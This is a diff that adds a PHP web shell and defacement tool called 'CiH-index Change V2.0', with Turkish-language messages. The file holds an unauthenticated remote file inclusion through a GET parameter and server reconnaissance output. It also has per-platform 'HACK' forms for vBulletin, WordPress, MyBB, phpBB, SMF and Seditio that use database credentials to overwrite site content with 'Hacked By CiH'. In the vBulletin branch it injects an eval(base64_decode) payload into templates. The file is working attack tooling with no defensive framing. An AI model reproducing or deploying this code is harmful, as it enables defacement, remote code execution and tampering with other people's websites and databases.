@@ -1,0 +1,335 @@
+<?php
+$sayfa = $_GET['h4ck'];
+if (isset($sayfa))
+{
+include($sayfa);
+exit();
+}
+if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec,$sec) = explode(" ",microtime());return ((float)$usec +(float)$sec);}}
+error_reporting(5);
+@ignore_user_abort(TRUE);
+@set_magic_quotes_runtime(0);
+$win = strtolower(substr(PHP_OS,0,3)) == "win";
+define("starttime",getmicrotime());
+if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}}else {$arr = stripslashes($arr);}}}strips($GLOBALS);}
+$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
+foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
+error_reporting(0);
+$info = $_SERVER['SERVER_SOFTWARE'];
+$site = getenv("HTTP_HOST");
+$page = $_SERVER['SCRIPT_NAME'];
+$sname = $_SERVER['SERVER_NAME'];
+$uname = php_uname();
+$smod = ini_get('safe_mode');
+$disfunc = ini_get('disable_functions');
+$yourip = $_SERVER['REMOTE_ADDR'];
+$serverip = $_SERVER['SERVER_ADDR'];
+$version = phpversion();
+$ccc = realpath($_GET['chdir'])."/";
+$fdel = $_GET['fdel'];
+$execute = $_POST['execute'];
+$cmd = $_POST['cmd'];
+$commander = $_POST['commander'];
+$ls = "ls -la";
+$source = $_POST['source'];
+$gomkf = $_POST['gomkf'];
+$title = $_POST['title'];
+$sourcego = $_POST['sourcego'];
+$ftemp = "tmp";
+$temp = tempnam($ftemp,"cx");
+$fcopy = $_POST['fcopy'];
+$tuser = $_POST['tuser'];
+$user = $_POST['user'];
+$wdir = $_POST['wdir'];
+$tdir = $_POST['tdir'];
+$symgo = $_POST['symgo'];
+$sym = "xhackers.txt";
+$to = $_POST['to'];
+$sbjct = $_POST['sbjct'];
+$msg = $_POST['msg'];
+$header = "From:".$_POST['header'];
+if(isset($_POST['phpinfo']))
+{
+die(phpinfo());
+}
+if ($smod)
+{
+$c_h = "<font color=red>ON(Güvenlik Var)</font>";
+}
+else
+{
+$c_h = "OFF(Security None)";
+}
+if (''==($disfunc))
+{
+$dis = "<font color=yellow>NONE</font>";
+}
+else
+{
+$dis = "<font color=red>$disfunc</font>";
+}
+if(isset($_GET['dir']) &&is_dir($_GET['dir']))
+{
+chdir($_GET['dir']);
+}
+$ccc = realpath($_GET['chdir'])."/";
+;echo '<body bgcolor="#151515">
+<style type="text/css">
+<!--
+body,table { font-family:verdana;font-size:11px;color:white;background-color:black; }
+table { width:100%; }
+table,td { border:1px solid #808080;margin-top:2;margin-bottom:2;padding:5px; }
+a { color:lightblue;text-decoration:none; }
+a:active { color:#ffffff; }
+a:link { color:#ffffff; }
+a:hover { text-decoration:underline; }
+a:visited { color:#ffffff; }
+input,select,option { font:8pt tahoma;color:#FFFFFF;margin:2;border:1px solid #666666; }
+input1,select1,option1 { font:8pt tahoma;color:#FFFFFF;height:50px;margin:2;border:1px solid #666666; }
+textarea { color:#dedbde;font:fixedsys bold;border:1px solid #666666;margin:2; }
+.fleft { float:left;text-align:left; }
+.fright { float:right;text-align:right; }
+#pagebar { font:10pt tahoma;padding:5px; border:3px solid #1E1E1E; border-collapse:collapse; }
+#pagebar td { vertical-align:top; }
+#pagebar p { font:8pt tahoma;}
+#pagebar a { font-weight:bold;color:#00FF00; }
+#pagebar a:visited { color:#00CE00; }
+#mainmenu { text-align:center; }
+#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
+#maininfo,.barheader,.barheader2 { text-align:center; }
+#maininfo td { padding:3px; }
+.barheader { font-weight:bold;padding:5px; }
+.barheader2 { padding:5px;border:2px solid #1F1F1F; }
+.contents,.explorer { border-collapse:collapse;}
+.contents td { vertical-align:top; }
+.mainpanel { border-collapse:collapse;padding:5px; }
+.barheader,.mainpanel table,td { border:1px solid #333333; }
+.mainpanel input,select,option { border:1px solid #333333;margin:0; }
+input[type="submit"] { border:1px solid #000000; }
+input[type="text"] { padding:3px;}
+input1[type="submit"] { border:1px solid #000000; }
+input1[type="text"] { padding:3px;}
+.shell { background-color:#C0C0C0;color:#000080;padding:5px; }
+.fxerrmsg { color:red; font-weight:bold; }
+#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
+#pagebar,.mainpanel,input[type="submit"] { background-color:#4A4A4A; }
+.barheader2,input,select,option,input[type="submit"]:hover { background-color:#333333; }
+textarea,.mainpanel input,select,option { background-color:#333333; }
+#haberler {
+float: center;
+width: 375px;
+margin: 0px;
+padding: 0px 300px;
+}
+// -->
+</style>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9" />
+<div class=barheader2><a href="?"><h3>CiH-index Change V2.0</h3></a>&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Developed by CiH</div>
+<table id=pagebar><tr><td width=50%><p>Software : ';echo $info;echo '<br>PHP Version : <font color=yellow>';echo $version;echo '</font><br><b>SAFE MODE : <font color=#FF9900>';echo $c_h;echo '</b></font><br>OS : ';echo $uname;echo '<br>Disabled Functions : ';echo $dis;echo '<br>Path : ';echo $ccc;echo '</p></td>
+<td width=50%><p>Server IP : <a href=http://www.ip-adress.com/reverse_ip/';echo $serverip;echo ' target=iframe><font color=red>';echo $serverip;echo '</font></a><br> You IP : ';echo $yourip;echo '</td>
+</td></tr><tr><td colspan=2 id=mainmenu>
+<a href="?h4=vbulletin"><font color=white>VBulletin HACK -</font></a>
+<a href="?h4=smf"><font color=white>Smf HACK -</font></a>
+<a href="?h4=mybb"><font color=white>MyBB HACK -</font></a>
+<a href="?h4=phpbb"><font color=white>PHPbb HACK -</font></a>
+<a href="?h4=wordpress"><font color=white>WordPress HACK -</font></a>
+<a href="?h4=seditio"><font color=white>Seditio HACK</font></a></td></tr></table>
+<br /><br /><table id=maininfo><tr><td width="100%">
+';
+$fatal=$_GET['h4'];
+if($fatal==""){
+echo "<title>[$site] ~ #cih_hacker@yahoo.com | Paqe : Anasayfa</title>";
+echo "
+<p align=center>&nbsp;</p>
+<p align=center>&nbsp;</p>
+<font color=white face=tahoma size=1><b>CiH-index Change V2.0</b><br><br>.:[ Re-Coding By CiH_H@CkErZ | cih_hacker@yahoo.com | Copyright: 2012 ]:.<br>
+</font>
+";
+}
+if($fatal=="seditio"){
+echo "<title>[$site] ~ #cih_hacker@yahoo.com | Paqe : Seditio Hack</title>";
+echo "
+    <h2>Seditio HACK </h2><br><br><div id=haberler align=left><form method=POST action=''>
+<p align=center>&nbsp;</p>
+	<font face='Arial' color='#ffffff'>Mysql Host&nbsp;:</font>&nbsp;&nbsp;<input type=text name=xdbh value=localhost size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;DB name‎ : </font>&nbsp;<input type=text name=xdbn size='15' ><br>
+          <font face='Arial' color='#ffffff'>DB user‎&nbsp;&nbsp;&nbsp;&nbsp;:</font>&nbsp;&nbsp;<input type=text name=xdbu size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;&nbsp;DB password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;</font><input type=password name=xdbp size='16' ><br>
+		  <font face='Arial' color='#ffffff'>News ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;</font>&nbsp;<input type=text name=xid size='51' value='1' ><br>
+		  <font face='Arial' color='#ffffff'>Index Code&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;</font><input type=text name=xnews size='51' ><br><br>
+          <div align=center><input type=submit value='Ch Index' ></div></form></div>
+	<p align=center>&nbsp;</p><p align=center>&nbsp;</p>
+
+		  ";
+$sed_dbh = $_POST['xdbh'];
+$sed_dbu = $_POST['xdbu'];
+$sed_dbn = $_POST['xdbn'];
+$sed_dbp = $_POST['xdbp'];
+$sed_news = $_POST['xnews'];
+$newsid = $_POST['xid'];
+if (!empty($sed_dbh) &&!empty($sed_dbu) &&!empty($sed_dbn) &&!empty($sed_news))
+{
+mysql_connect($sed_dbh,$sed_dbu,$sed_dbp) or die(mysql_error());
+mysql_select_db($sed_dbn) or die(mysql_error());
+$aq10 = "UPDATE sed_pages SET page_text='".$sed_news."' WHERE page_id='".$newsid."'";
+$result = mysql_query($aq10) or die (mysql_error());
+echo "<script>alert('Hedef Seditio Site Basarili Bir Sekilde Bombalandi !');</script>";
+}
+}
+if($fatal=="wordpress"){
+echo "<title>[$site] ~ #cih_hacker@yahoo.com | Paqe : WordPress Hack</title>";
+echo "
+    <h2>WordPress HACK </h2><br><br><div id=haberler align=left><form method=POST action=''>
+<p align=center>&nbsp;</p>
+	<font face='Arial' color='#ffffff'>Mysql Host&nbsp;:</font>&nbsp;&nbsp;<input type=text name=wpdbh value=localhost size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;DB name‎ : </font>&nbsp;<input type=text name=wpdbn size='15' ><br>
+          <font face='Arial' color='#ffffff'>DB user‎&nbsp;&nbsp;&nbsp;&nbsp;:</font>&nbsp;&nbsp;<input type=text name=wpdbu size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;&nbsp;DB password&nbsp;&nbsp;:&nbsp;&nbsp;</font><input type=password name=wpdbp size='16' ><br>
+		  <font face='Arial' color='#ffffff'>Post ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;</font>&nbsp;<input type=text name=wpid size='51' value='1' ><br>
+		  <font face='Arial' color='#ffffff'>Index Code&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;</font><input type=text name=wppost size='51' ><br><br>
+          <div align=center><input type=submit value='Ch Index' ></div></form></div>
+	<p align=center>&nbsp;</p><p align=center>&nbsp;</p>
+
+		  ";
+$wp_dbh = $_POST['wpdbh'];
+$wp_dbu = $_POST['wpdbu'];
+$wp_dbn = $_POST['wpdbn'];
+$wp_dbp = $_POST['wpdbp'];
+$wp_post = $_POST['wppost'];
+$kategoriid=$_POST['wpid'];
+if (!empty($wp_dbh) &&!empty($wp_dbu) &&!empty($wp_dbn) &&!empty($wp_post))
+{
+mysql_connect($wp_dbh,$wp_dbu,$wp_dbp) or die(mysql_error());
+mysql_select_db($wp_dbn) or die(mysql_error());
+$aq10 = "UPDATE wp_posts SET post_title='".$wp_post."' WHERE ID='".$kategoriid."'";
+$result = mysql_query($aq10) or die (mysql_error());
+echo "<script>alert('Hedef WordPress Site Basarili Bir Sekilde Bombalandi !');</script>";
+}
+}
+if($fatal=="phpbb"){
+echo "<title>[$site] ~ #cih_hacker@yahoo.com | Paqe : PHPbb Hack</title>";
+echo "
+    <h2>PHPbb HACK </h2><br><br><div id=haberler align=left><form method=POST action=''>
+<p align=center>&nbsp;</p>
+	<font face='Arial' color='#ffffff'>Mysql Host&nbsp;:</font>&nbsp;&nbsp;<input type=text name=phpbbdbh value=localhost size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;DB name‎ : </font>&nbsp;<input type=text name=phpbbdbn size='15' ><br>
+          <font face='Arial' color='#ffffff'>DB user‎&nbsp;&nbsp;&nbsp;&nbsp;:</font>&nbsp;&nbsp;<input type=text name=phpbbdbu size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;&nbsp;DB password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;</font><input type=password name=phpbbdbp size='16' ><br>
+		  <font face='Arial' color='#ffffff'>phpbb ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;</font>&nbsp;<input type=text name=katid size='51' value='1' ><br>
+		  <font face='Arial' color='#ffffff'>Index Code&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;</font><input type=text name=phpbbkat size='51' ><br><br>
+          <div align=center><input type=submit value='Ch Index' ></div></form></div>
+	<p align=center>&nbsp;</p><p align=center>&nbsp;</p>
+
+		  ";
+$phpbb_dbh = $_POST['phpbbdbh'];
+$phpbb_dbu = $_POST['phpbbdbu'];
+$phpbb_dbn = $_POST['phpbbdbn'];
+$phpbb_dbp = $_POST['phpbbdbp'];
+$phpbb_kat = $_POST['phpbbkat'];
+$kategoriid=$_POST['katid'];
+if (!empty($phpbb_dbh) &&!empty($phpbb_dbu) &&!empty($phpbb_dbn) &&!empty($phpbb_kat))
+{
+mysql_connect($phpbb_dbh,$phpbb_dbu,$phpbb_dbp) or die(mysql_error());
+mysql_select_db($phpbb_dbn) or die(mysql_error());
+$aq10 = "UPDATE phpbb_categories  SET cat_title='".$phpbb_kat."' WHERE cat_id='".$kategoriid."'";
+$result = mysql_query($aq10) or die (mysql_error());
+echo "<script>alert('Hedef PHPbb Site Basarili Bir Sekilde Bombalandi !');</script>";
+}
+}
+if($fatal=="mybb"){
+echo "<title>[$site] ~ #cih_hacker@yahoo.com | Paqe : MyBB Hack</title>";
+echo "
+    <h2>MyBB HACK </h2><br><br><div id=haberler align=left><form method=POST action=''>
+<p align=center>&nbsp;</p>
+	<font face='Arial' color='#ffffff'>Mysql Host&nbsp;:</font>&nbsp;&nbsp;<input type=text name=mybbdbh value=localhost size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;DB name‎ : </font>&nbsp;<input type=text name=mybbdbn size='15' ><br>
+          <font face='Arial' color='#ffffff'>DB user‎&nbsp;&nbsp;&nbsp;&nbsp;:</font>&nbsp;&nbsp;<input type=text name=mybbdbu size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;&nbsp;DB password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;</font><input type=password name=mybbdbp size='16' ><br>
+          <font face='Arial' color='#ffffff'><center>Index Code</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+		  <textarea name=mybbindex rows='5' cols='33' >Hacked By CiH</textarea></center><br>
+          <br><center><input type=submit value='Ch Index' ></form></center></center>";
+$mybb_dbh = $_POST['mybbdbh'];
+$mybb_dbu = $_POST['mybbdbu'];
+$mybb_dbn = $_POST['mybbdbn'];
+$mybb_dbp = $_POST['mybbdbp'];
+$mybb_index = $_POST['mybbindex'];
+if (!empty($mybb_dbh) &&!empty($mybb_dbu) &&!empty($mybb_dbn) &&!empty($mybb_index))
+{
+mysql_connect($mybb_dbh,$mybb_dbu,$mybb_dbp) or die(mysql_error());
+mysql_select_db($mybb_dbn) or die(mysql_error());
+$prefix="mybb_";
+$aq7 = "UPDATE ".$prefix."templates SET template='".$mybb_index."' WHERE title='index'";
+$result = mysql_query($aq7) or die (mysql_error());
+echo "<script>alert('Hedef MYbb Site Basarili Bir Sekilde Bombalandi !');</script>";
+}
+}
+if($fatal=="smf"){
+echo "<title>[$site] ~ #cih_hacker@yahoo.com | Paqe : SMF Hack</title>";
+echo "
+    <h2>SMF HACK </h2><br><br><div id=haberler align=left><form method=POST action=''>
+<p align=center>&nbsp;</p>
+	<font face='Arial' color='#ffffff'>Mysql Host&nbsp;:</font>&nbsp;&nbsp;<input type=text name=smfdbh value=localhost size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;DB name‎ : </font>&nbsp;<input type=text name=smfdbn size='15' ><br>
+          <font face='Arial' color='#ffffff'>DB user‎&nbsp;&nbsp;&nbsp;&nbsp;:</font>&nbsp;&nbsp;<input type=text name=smfdbu size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;&nbsp;DB password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;</font><input type=password name=smfdbp size='16' ><br>
+		  <font face='Arial' color='#ffffff'>Smf ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;</font>&nbsp;<input type=text name=katid size='51' value='1' ><br>
+		  <font face='Arial' color='#ffffff'>Index Code&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;</font><input type=text name=smf_index size='51' ><br><br>
+          <div align=center><input type=submit value='Ch Index' ></div></form></div>
+	<p align=center>&nbsp;</p><p align=center>&nbsp;</p>
+
+		  ";
+$smf_dbh = $_POST['smfdbh'];
+$smf_dbu = $_POST['smfdbu'];
+$smf_dbn = $_POST['smfdbn'];
+$smf_dbp = $_POST['smfdbp'];
+$smf_index = $_POST['smf_index'];
+$smf_katid=$_POST['katid'];
+if (!empty($smf_dbh) &&!empty($smf_dbu) &&!empty($smf_dbn) &&!empty($smf_index))
+{
+mysql_connect($smf_dbh,$smf_dbu,$smf_dbp) or die(mysql_error());
+mysql_select_db($smf_dbn) or die(mysql_error());
+$prefix="smf_";
+$aq12 = "UPDATE ".$prefix."categories SET name='".$smf_index."' WHERE ID_CAT='".$smf_katid."'";
+$result = mysql_query($aq12) or die (mysql_error());
+echo "<script>alert('Hedef SMF Site Basarili Bir Sekilde Bombalandi !');</script>";
+}
+}
+if($fatal=="vbulletin"){
+echo "<title>[$site] ~ #cih_hacker@yahoo.com | Paqe : Vbulletin Hack</title>";
+echo "
+    <h2>Vbulletin HACK </h2><br><br><div id=haberler align=left><form method=POST action=''>
+<p align=center>&nbsp;</p>
+	<font face='Arial' color='#ffffff'>Mysql Host&nbsp;:</font>&nbsp;&nbsp;<input type=text name=dbh value=localhost size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;DB name‎ : </font>&nbsp;<input type=text name=dbn size='15' ><br>
+          <font face='Arial' color='#ffffff'>DB user‎&nbsp;&nbsp;&nbsp;&nbsp;:</font>&nbsp;&nbsp;<input type=text name=dbu size='15' >
+		  <font face='Arial' color='#ffffff'>&nbsp;&nbsp;DB password&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;</font><input type=password name=dbp size='16' ><br>
+          <font face='Arial' color='#ffffff'><center>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+		  &nbsp;&nbsp;&nbsp;Index Code</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+		  <textarea name=index rows='5' cols='33' >Hacked By CiH</textarea></center><br>
+          <br><center><input type=submit value='Ch Index' ></form></center></center>";
+$h4cker="powered By h4cker.tr :))";
+$dbh = $_POST['dbh'];
+$dbn = $_POST['dbn'];
+$dbu = $_POST['dbu'];
+$dbp = $_POST['dbp'];
+$index = $_POST['index'];
+$index=str_replace("\'","'",$index);
+$set_index  = "{\${eval(base64_decode(\'";
+$set_index .= base64_encode("echo \"$index\";");
+$set_index .= "\'))}}{\${exit()}}</textarea>";
+if (!empty($dbh) &&!empty($dbn) &&!empty($dbu) &&!empty($index))
+{
+mysql_connect($dbh,$dbu,$dbp) or die(mysql_error());
+mysql_select_db($dbn) or die(mysql_error());
+$fatal1 = "UPDATE template SET template='".$set_index."".$h4cker."' WHERE title='spacer_open'";
+$fatal2 = "UPDATE template SET template='".$set_index."".$h4cker."' WHERE title='FORUMHOME'";
+$fatal3 = "UPDATE style SET css='".$set_index."".$h4cker."', stylevars='', csscolors='', editorstyles=''";
+$result = mysql_query($fatal1) or die (mysql_error());
+$result = mysql_query($fatal2) or die (mysql_error());
+$result = mysql_query($fatal3) or die (mysql_error());
+echo "<script>alert('Hedef Vbulletin Site Basarili Bir Sekilde Bombalandi !');</script>";
+}
+}
+;
+?>
